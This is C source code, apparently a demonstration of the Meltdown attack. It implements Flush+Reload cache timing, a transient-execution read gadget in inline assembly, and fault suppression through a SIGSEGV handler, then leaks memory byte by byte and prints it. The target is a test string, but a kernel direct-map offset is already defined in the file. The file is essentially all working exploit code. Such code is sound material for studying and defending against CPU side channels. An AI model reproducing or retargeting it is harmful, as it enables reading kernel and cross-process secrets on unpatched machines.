#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>



size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
int measurements = 100; /**< Number of measurements to perform for one address */
int accept_after = 1; /**< How many measurements must be the same to accept the read value */
int retries = 10000; /**< Number of Meltdown retries for an address */
char *mem = NULL, *_mem = NULL;
static size_t phys = 0;
char *TestString = "Ammar + Khalid + Khalid + 7elmi + d7oom";
static jmp_buf buf;
static int val;

#define DEFAULT_PHYSICAL_OFFSET 0xffff880000000000ull



static inline size_t rdtsc() {
  size_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("lfence");
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
  asm volatile("lfence");
  return a;
}

static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}



void calc_cache_threshold(){
  size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  size_t start = 0, end = 0;

  maccess(ptr);
  for(int i = 0 ; i< count ; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    reload_time += (end-start);
  }
  for(int i = 0; i<count; i++){
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
    flush(ptr);
    flush_reload_time += (end - start);
  }

  reload_time /= count;
  flush_reload_time /= count;

  cache_miss_threshold = (flush_reload_time + reload_time*2)/3;
}

int Flush_Reload(void *ptr){
size_t start = 0, end = 0;

start = rdtsc();
maccess(ptr);
end = rdtsc();

flush(ptr);
/*                                         */
if((end  - start) < cache_miss_threshold){
  return 1;
}
  return 0;
}

#ifdef __x86_64__


#define meltdown_nonull                                                        \
  asm volatile("1:\n"                                                          \
               "movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(phys), "b"(mem)                                           \
               : "rax");
#endif

#ifndef Meltdown
#define Meltdown meltdown_nonull
#endif


  static void unblock_signal(int signum __attribute__((__unused__))) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  }

  static void segfault_handler(int signum) {
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(buf,1);
    }

int __attribute__((optimize("-Os"), noinline)) READ(size_t addr) {
  phys = addr;
  retries++;
  size_t start = 0, end = 0;

while(retries--){
 if(!setjmp(buf)){
  Meltdown;
 }
    int i;
    for(i = 0 ; i < 256 ; i++){
      if(Flush_Reload(mem + i*4096)){
        if(i>=1){
          return i;
        }
      }
    }
  }
return 0;
}


int __attribute__((optimize("-O0"))) Read(size_t addr){
  phys = addr;

  char prope[256];
  for(int i = 0; i< 256; i++)
    prope[i]=0;

  for(int i=0;i<measurements;i++){
    int vall = READ(phys);
    prope[vall]++;
  }

  int max_v = 0, max_i = 0;

  for (int i = 1; i< 256; i++){
    if (prope[i] > max_v && prope[i] >= accept_after){
      max_v = prope[i];
      max_i = i;
    }
  }
  return max_i;
}


__attribute__((visibility("default"))) int main() {
  signal(SIGSEGV,segfault_handler);
  calc_cache_threshold();

  _mem = malloc(4096 * 300);
  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
  memset(mem, 0xab, 4096 * 290);
  for (int j = 0; j < 256; j++) {
    flush(mem + j * 4096);
  }


    size_t address = TestString;

  while (1) {
    int value = Read(address);
    printf("%c", value);
    fflush(stdout);
  address++;
  }
  free(_mem);

  return 0;
}
